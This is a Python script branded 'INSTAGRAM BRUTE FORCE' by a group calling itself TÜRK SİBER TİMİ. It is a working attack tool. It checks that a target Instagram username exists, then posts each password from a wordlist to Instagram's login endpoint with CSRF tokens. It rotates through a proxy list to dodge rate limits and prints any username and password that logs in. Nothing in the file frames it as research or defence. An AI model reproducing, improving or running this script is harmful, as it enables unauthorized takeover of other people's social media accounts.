
'''
TODO LIST:
	Fix and make proxy function better
	Sort code again
	Add help function to all "Yes/no" questions
	Add help  function to "Enter e bas çık "
'''
import requests
import json
import time
import os
import random
import sys

#Help function
def Input(text):
	value = ''
	if sys.version_info.major > 2:
		value = input(text)
	else:
		value = raw_input(text)
	return str(value)

#The main class
class Instabrute():
	def __init__(self, username, passwordsFile='password.txt'):
		self.username = username
		self.CurrentProxy = ''
		self.UsedProxys = []
		self.passwordsFile = passwordsFile
		
		#Check if passwords file exists
		self.loadPasswords()
		#Check if username exists
		self.IsUserExists()


		UsePorxy = Input('[*] Proxy Listesi Kullanılsınmı? (y/n): ').upper()
		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
			self.randomProxy()


	#Check if password file exists and check if he contain passwords
	def loadPasswords(self):
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				self.passwords = f.read().splitlines()
				passwordsNumber = len(self.passwords)
				if (passwordsNumber > 0):
					print ('[*] %s Tane Sifre Bulundu deneniyor' % passwordsNumber)
				else:
					print('Listede Sifre yok Lutfen password.txt icine sifre ekle .')
					Input('[*] Enter e bas cık ')
					exit()
		else:
			print ('Password.txt adli wordlist bulunamadi lutfen ekleyin "%s"' % self.passwordsFile)
			Input('[*] Enter e bas çık')
			exit()

	#Choose random proxy from proxys file
	def randomProxy(self):
		plist = open('proxylist.txt').read().splitlines()
		proxy = random.choice(plist)

		if not proxy in self.UsedProxys:
			self.CurrentProxy = proxy
			self.UsedProxys.append(proxy)
		try:
			print('')
			print('[*] Yeni Ip seciliyor...')
			print ('[*] Secilen ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
		except Exception as e:
			print  ('[*] Proxye bağlanmadı :( baska proxy dene "%s"' % proxy)
		print('')


	#Check if username exists in instagram server
	def IsUserExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
		if (r.status_code == 404):
			print ('[*] Kullanıcı adı "%s" Bulunamadı ' % username)
			Input('[*] Enter e bas çık ')
			exit()
		elif (r.status_code == 200):
			return True

	#Try to login with password
	def Login(self, password):
		sess = requests.Session()

		if len(self.CurrentProxy) > 0:
			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }

		#build requests headers
		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		#Update token after enter to the site
		r = sess.get('https://www.instagram.com/') 
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

		#Update token after login to the site 
		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
		
		#parse response
		data = json.loads(r.text)
		if (data['status'] == 'fail'):
			print (data['message'])

			UsePorxy = Input('[*] Proxy listesi kullanilsinmi (y/n): ').upper()
			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
				print ('[$] Try to use proxy after fail.')
				randomProxy() #Check that, may contain bugs
			return False

		#return session if password is correct 
		if (data['authenticated'] == True):
			return sess 
		else:
			return False

print("""\033[32;1m
              
   
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶___¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶ 
¶¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶¶ 
¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶______¶¶¶_¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶ 
¶¶¶¶¶___¶¶¶¶¶¶¶¶¶_______________________¶¶¶¶¶ 
¶¶¶¶__¶¶¶¶¶¶¶¶¶_________¶¶________¶¶¶¶¶__¶¶¶¶ 
¶¶¶__¶¶¶¶¶¶¶¶¶¶_________________¶¶¶¶¶¶¶¶__¶¶¶ 
¶¶__¶¶¶¶¶¶¶¶¶¶¶_____________¶¶¶__¶¶¶¶¶¶¶¶__¶¶ 
¶¶_¶¶¶¶¶¶¶¶¶¶¶_________¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶_¶¶ 
¶__¶¶¶¶¶¶¶¶¶¶¶_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶ 
¶_¶¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶ 
¶_¶¶¶¶¶¶¶¶¶¶¶¶_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶ 
¶_¶¶¶¶¶¶¶¶¶¶¶¶___________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶ 
¶_¶¶¶¶¶¶¶¶¶¶¶_____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶ 
¶_¶¶¶¶¶¶¶¶¶¶¶_____¶¶______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶ 
¶__¶¶¶¶¶¶¶¶¶______¶¶¶______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶ 
¶¶_¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶ 
¶¶__¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶ 
¶¶¶__¶¶¶¶_______¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶__¶¶¶ 
¶¶¶¶__¶¶_______¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶__¶¶¶¶ 
¶¶¶¶¶__¶______¶¶¶¶¶¶¶¶¶¶¶¶___¶¶¶¶¶¶¶¶¶__¶¶¶¶¶ 
¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶__¶¶¶¶¶¶¶ 
¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______¶¶___¶¶¶¶¶¶¶¶ 
¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶ 
¶¶¶¶¶¶¶¶¶¶¶¶¶¶________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
 
       
          
                   -=[INSTAGRAM BRUTE FORCE ATAĞI TST]=-
                   -=[YAPIMCI: MAJESTAR]=-
                   -=[Team : TÜRK SİBER TİMİ]=-
                   -=[INSTAGRAM: x__majestar__x]=-
        
      

_________________[TÜRK SİBER TİMİ 2019]____________________

BU INSTAGRAM BRUTE FORCE ATAĞIDIR PASSWORD LISTESINI ATIN ICINE
PROXY LISTESI TAMAMEN BANA AİTTİR TÜRK SİBER TİMİ 
FOR BY CAPTAIN.   MR.PİAXY. CONDOR
_________________[Yıl  2019]_____________________

""")

print("""\033[31;1m

                                                                     
₮ÜⱤ₭ ₴İ฿ɆⱤ ₮İ₥İ                                                                                       

""")
instabrute = Instabrute(Input('\033[32;1mLütfen Kullanıcı Adını Giriniz: '))

try:
	delayLoop = int(Input('\033[36;1m[*] Lütfen kac saniyede bir sifre denesin yazin  (1 yaz): ')) 
except Exception as e:
	print ('[*] Hata!, yazılım icin bu degeri kullan sayı kullan!( "1"')
	delayLoop = 4
print ('')



for password in instabrute.passwords:
	sess = instabrute.Login(password)
	if sess:
		print ('[*] Giriş Başarılı %s' % [instabrute.username,password])
	else:
		print ('[*] Şifre Deneniyor [%s]' % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		WantToExit = str(Input('Type y/n to exit: ')).upper()
		if (WantToExit == 'Y' or WantToExit == 'YES'):
			exit()
		else:
			continue
		




